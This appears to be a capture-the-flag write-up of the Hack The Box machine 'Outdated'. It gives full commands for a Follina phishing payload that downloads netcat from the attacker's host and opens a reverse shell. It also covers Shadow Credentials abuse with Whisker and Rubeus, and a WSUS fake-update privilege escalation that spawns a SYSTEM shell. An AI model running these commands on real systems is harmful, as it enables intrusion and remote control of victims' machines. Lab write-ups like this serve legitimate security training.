---
title: "HTB - Outdated"
date: 2023-03-11T18:49:06+01:00
draft: false
tags: [HTB, Medium, Windows, skwaks, follina, WSUS, ShadowCreds, Whiskers, PowerSharpPack, Rubeus]
---

## Foothold
### Nmap
```
25/tcp open smtp hMailServer smtpd  
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP  
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 19:19:09Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  
| Not valid before: 2022-06-18T05:50:24  
|_Not valid after: 2024-06-18T06:00:24  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  
| Not valid before: 2022-06-18T05:50:24  
|_Not valid after: 2024-06-18T06:00:24  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  
| Not valid before: 2022-06-18T05:50:24  
|_Not valid after: 2024-06-18T06:00:24  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  
| ssl-cert: Subject:  
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  
| Not valid before: 2022-06-18T05:50:24  
|_Not valid after: 2024-06-18T06:00:24  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
8530/tcp open http Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: Site doesn't have a title.  
| http-methods:  
|_ Potentially risky methods: TRACE  
8531/tcp open unknown  
9389/tcp open mc-nmf .NET Message Framing  
49667/tcp open msrpc Microsoft Windows RPC  
49679/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
49680/tcp open msrpc Microsoft Windows RPC  
49683/tcp open msrpc Microsoft Windows RPC  
49918/tcp open msrpc Microsoft Windows RPC  
49924/tcp open msrpc Microsoft Windows RPC  
56328/tcp open msrpc Microsoft Windows RPC  
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
SMTP port open (25) +  WSUS port open (8530)

### smbclient
| Sharename | Type | Comment |
|-------------|------|-----------|
|ADMIN$| Disk |Remote Admin  |
|C$| Disk |Default share  |
|IPC$| IPC Remote IPC  |
|NETLOGON| Disk Logon server share  |
|Shares| Disk  |
|SYSVOL Disk| Logon server share  |
|UpdateServicesPackages | Disk |A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. |
|WsusContent| Disk| A network share to be used by Local Publishing to place published content on this WSUS system.  |
|WSUSTemp | Disk | A network share used by Local Publishing from a Remote WSUS Console Instance.|

Inside the *Shares* directory, we can retrieve a pdf file with a listing of multiple CVEs to patch. 
It also ask to send an email to *itsupport@outdated.htb* with a link to any malicious site or endpoint in order to protect the system or whatever against it. 

Let's try exploiting those CVEs one by one then!

## User
>Luckily, the first was the right one !

Using the follina exploit script from [here](https://github.com/chvancooten/follina.py) we can serve a malicious document along side netcat.

```
> python follina.py -t docx -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c powershell curl 10.10.X.X:8000/nc64.exe -o c:\windows\tasks\nc.exe; c:\windows\tasks\nc.exe -e cmd.exe 10.10.X.X XXXX'"
> swaks --to itsupport@outdated.htb --body "http://10.10.X.X/exploit.html"
> nc -lnvp XXXX
```

We're in  as user btables@outdated.htb ! Let's use groundhog / winpeas !
![[Pasted image 20220818193654.png]]

ShadowCreds to the user *sflowers*.. nice !

Using `Whisker` from [here (uncompiled)](https://github.com/eladshamir/Whisker)  or [here (compiled and obfuscated)](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries)and Rubeus:

> I used the PowerSharpBinaries, as i didn't wanted to compile the C# project.
> PowerSharpPack is realy usefull

```
> ./Whisker.exe add /target:sflowers
> ./Rubeus.exe <the rest of the command Whisker gave as an output>
```

Got the NT hash of *sflowers*: 1FCDB1F6015DCB318CC77BB2BDA14DB5

Let's use it with evil-winrm...

Got user.txt

## LPE
> Obviously, WSUS is the target here. Let's cut to the chase and directly try to exploit it...

> Thx hAAAAAAAAAAAAAAAAcktricks
> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

The system appears to be vulnerable.

We can use sharpWSUS from the [PowerSharpPack toolbox](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) in order to fake an update and create a reverse shell using previously uploaded netcat.
We need to upload PsExec64.exe 

```
> nc -lnvp 4444
> ./SharpWSUS create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"c:\windows\tasks\nc.exe -e cmd.exe 10.10.X.X XXXX\"" /title:"azerazer" # create a new udpate
> SharpWSUS approve /updateid:<update_id> /computername:dc.outdated.htb /groupname:"azerazer" # approve it
> SharpWSUS check /updatedid:<update_id /computername:dc.outdated.htb # check wether it has been installed or not. 
```
Wait for a bit and you've got your revshell.

AAAAAAAAAAAAAAAA